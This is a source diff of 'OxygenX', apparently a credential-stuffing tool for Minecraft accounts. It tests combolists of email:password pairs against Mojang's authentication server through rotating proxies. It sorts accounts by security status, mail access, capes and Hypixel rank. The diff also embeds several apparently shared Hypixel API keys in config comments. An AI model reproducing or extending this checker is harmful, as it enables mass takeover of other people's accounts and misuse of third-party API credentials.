@@ -1,4 +1,5 @@
 from ctypes import windll
+from math import floor, sqrt
 from multiprocessing.dummy import Pool as ThreadPool
 from os import mkdir, path, system
 from queue import Queue
@@ -21,7 +22,7 @@ while True:
         open('config.yml', 'w').write('''checker:
   # Amount of checks for a account many times to check a account.
   # Needs to be 1 or higher
-  retries: 2
+  retries: 3
 
   # Higher for better accuracy but slower (counted in milliseconds)
   timeout: 15000
@@ -40,6 +41,16 @@ while True:
 
   # User should keep this false
   debugging: false
+  
+  # Api key to check hypixel ranks and levels
+  # use any key from the following
+  # 79326ca4-54b2-4a8a-a5b4-d9ee111f674b
+  # 99ad5c56-5320-4b0c-9e4f-a7af1c9641f9
+  # 0f649707-2603-4fd8-853e-8c80ae93e3a9
+  # cdfa2b06-d2c9-4525-9154-2b204d6b4f0b
+  # 01c39cd8-dffc-4ce4-8faf-5069bc9d06ba
+  # 0c723844-5762-4366-9034-3be21758b685
+  hypixel_api_key: '79326ca4-54b2-4a8a-a5b4-d9ee111f674b'
 
   capes:
     # Check capes
@@ -101,7 +112,7 @@ class Counter:
 
 class Main:
     def __init__(self):
-        self.version = '0.2'
+        self.version = '0.2b'
         windll.kernel32.SetConsoleTitleW(f'OxygenX-{self.version} | by ShadowOxygen')
         self.printing = Queue()
         self.caputer = Queue()
@@ -109,6 +120,8 @@ class Main:
         self.bad = Queue()
         self.towrite = Queue()
         self.accounts = []
+        self.mcurl = 'https://authserver.mojang.com/authenticate'
+        self.secureurl = 'https://api.mojang.com/user/security/challenges'
         self.maheaders = {'User-Agent': 'MyCom/12436 CFNetwork/758.2.8 Darwin/15.0.0', 'Pragma': 'no-cache'}
         self.hyr = compile(r'\n<span class=\"rank-badge rank-badge-.*\">(.*)</span>')
         self.hyl = compile(r"Player's Network Level\".*>(.*)<")
@@ -130,6 +143,12 @@ class Main:
         self.liquidcape = Checker.Cape.liquidbounce
         self.labymodcape = Checker.Cape.labymod
         self.debug = Checker.debug
+        if self.liquidcape:
+            capesz = self.liquidbounce()
+            if self is not False:
+                self.lbcape = capesz
+            else:
+                self.liquidcape = False
         if self.retries == 0:
             self.retries = 1
         if self.threads == 0:
@@ -334,7 +353,7 @@ class Main:
                         self.towrite.put([f'{line} | Username: {username}', 'LabymodCape'])
                         data += '\nLabymodCape: True'
                 if self.liquidcape:
-                    if self.liquidbounce(uuid):
+                    if uuid in self.lbcape:
                         Counter.liquidbounce += 1
                         self.towrite.put([f'{line} | Username: {username}', 'LiquidBounceCape'])
                         data += '\nLiquidBounceCape: True'
@@ -359,7 +378,6 @@ class Main:
 
     def checkmc(self, user, passw):
         try:
-            headerz = {"Content-Type": "application/json"}
             payload = ({
                 'agent': {
                     'name': 'Minecraft',
@@ -370,14 +388,15 @@ class Main:
                 'requestUser': 'true'
             })
             if not Checker.Proxy.proxy:
-                answer = post('https://authserver.mojang.com/authenticate', json=payload,
-                              headers=headerz, timeout=Checker.timeout / 1000).json()
+                answer = post(self.mcurl, json=payload,
+                              headers={"Content-Type": "application/json"}, timeout=Checker.timeout / 1000).json()
             else:
                 while True:
                     try:
-                        answer = post('https://authserver.mojang.com/authenticate', proxies=self.proxies(),
+                        answer = post(self.mcurl, proxies=self.proxies(),
                                       json=payload,
-                                      headers=headerz, timeout=Checker.timeout / 1000).json()
+                                      headers={"Content-Type": "application/json"},
+                                      timeout=Checker.timeout / 1000).json()
                         break
                     except:
                         continue
@@ -391,10 +410,9 @@ class Main:
     def securedcheck(self, token):
         try:
             while True:
-                hds = {"Authorization": f"Bearer {token}"}
                 try:
-                    lol = get('https://api.mojang.com/user/security/challenges',
-                              headers=hds, proxies=self.proxies(), timeout=8).text
+                    lol = get(self.secureurl,
+                              headers={"Authorization": f"Bearer {token}"}, proxies=self.proxies(), timeout=8).text
                     break
                 except:
                     continue
@@ -409,14 +427,14 @@ class Main:
         while self.stop:
             windll.kernel32.SetConsoleTitleW(
                 f"OxygenX-{self.version} | "
-                f"Hits: {str(Counter.hits)}"
-                f" | Bad: {str(Counter.bad)}"
-                f' | Secured: {str(Counter.nfa)}'
-                f' | Unsecured: {str(Counter.sfa)}'
-                f' | Demo: {str(Counter.demo)}'
-                f' | Mail Access: {str(Counter.emailaccess)}'
-                f' | Unmigrated: {str(Counter.unfa)}'
-                f" | Left: {str(len(self.combolist) - (Counter.hits + Counter.bad + Counter.demo))}")
+                f"Hits: {Counter.hits}"
+                f" | Bad: {Counter.bad}"
+                f' | Secured: {Counter.nfa}'
+                f' | Unsecured: {Counter.sfa}'
+                f' | Demo: {Counter.demo}'
+                f' | Mail Access: {Counter.emailaccess}'
+                f' | Unmigrated: {Counter.unfa}'
+                f" | Left: {len(self.combolist) - (Counter.hits + Counter.bad + Counter.demo)}")
             sleep(0.01)
 
     def prints(self):
@@ -470,7 +488,7 @@ class Main:
 
     def optifine(self, username):
         try:
-            optifine = get(f'http://107.182.233.85/capes/{username}.png', timeout=6).text
+            optifine = get(f'http://s.optifine.net/capes/{username}.png', timeout=6).text
             if not str(optifine).__contains__('Not found'):
                 return True
             else:
@@ -500,8 +518,9 @@ class Main:
 
     def labymod(self, uuid):
         try:
-            uuid_with_dashes = uuid[:8] + '-' + uuid[8:12] + '-' + uuid[12:16] + '-' + uuid[16:20] + '-' + uuid[20:]
-            laby = get(f'http://capes.labymod.net/capes/{uuid_with_dashes}', timeout=6).text
+            laby = get(
+                f'http://capes.labymod.net/capes/{uuid[:8]}-{uuid[8:12]}-{uuid[12:16]}-{uuid[16:20]}-{uuid[20:]}',
+                timeout=6).text
             if not str(laby).__contains__('Not Found'):
                 return True
             else:
@@ -511,15 +530,12 @@ class Main:
                 self.printing.put(f'{Fore.LIGHTRED_EX}Error Labymod:\n{e}{Fore.WHITE}')
             return False
 
-    def liquidbounce(self, uuid):
+    def liquidbounce(self):
         try:
             lbc = get(
                 f'https://raw.githubusercontent.com/CCBlueX/FileCloud/master/LiquidBounce/cape/service.json',
                 timeout=6).text
-            if lbc.__contains__(uuid):
-                return True
-            else:
-                return False
+            return lbc
         except Exception as e:
             if self.debug:
                 self.printing.put(f'{Fore.LIGHTRED_EX}Error LiquidBounce:\n{e}{Fore.WHITE}')
@@ -559,19 +575,46 @@ class Main:
             return both
 
     def hypixel(self, uuid):
-        both = ['False', '0']
-        headers = {
-            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36'}
+        both = ['', '']
         try:
-            response = get(f'https://hypixel.net/player/{uuid}', headers=headers, timeout=8).text
-            if response.__contains__("Player's Network Level"):
-                both[1] = self.hyl.search(response).group(1)
-                if '\n<span class="rank-badge' in response:
-                    both[0] = self.hyr.search(response).group(1)
+            answer_json = get(
+                f'https://api.hypixel.net/player?key={Checker.hypixel_api_key}&uuid={uuid}').json()
+            rank = ''
+            level = ''
+            try:
+                level = floor(-2.5 + sqrt(12.25 + 0.0008 * answer_json["player"]['networkExp']))
+            except:
+                pass
+            try:
+                rank = answer_json['player']['rank']
+            except:
+                pass
+            try:
+                if answer_json["player"]['monthlyPackageRank'] == 'SUPERSTAR':
+                    rank = 'MVP++'
+                else:
+                    rank = ''
+            except:
+                pass
+            try:
+                if rank == '':
+                    rank = answer_json["player"]['newPackageRank'].replace('_PLUS', '+')
+            except:
+                pass
+            if rank == '':
+                both[0] = 'False'
+            else:
+                both[0] = rank
+            if level == '':
+                both[1] = '0'
+            else:
+                both[1] = level
             return both
-        except Exception as ed:
-            if self.debug:
-                self.printing.put(f'{Fore.LIGHTRED_EX}Error Hypixel:\n{ed}{Fore.WHITE}')
+        except Exception as e:
+            print(e)
+            print('Hypixel API is Down')
+            both[1] = 0
+            both[0] = 'False'
             return both
 
     def mailaccess(self, email, password):
@@ -592,6 +635,7 @@ class Checker:
     save_rankedtypes = bool(config['checker']['save_rankedtypes'])
     save_bad = bool(config['checker']['save_bad'])
     debug = bool(config['checker']['debugging'])
+    hypixel_api_key = str(config['checker']['hypixel_api_key'])
 
     class Cape:
         liquidbounce = bool(config['checker']['capes']['liquidbounce'])
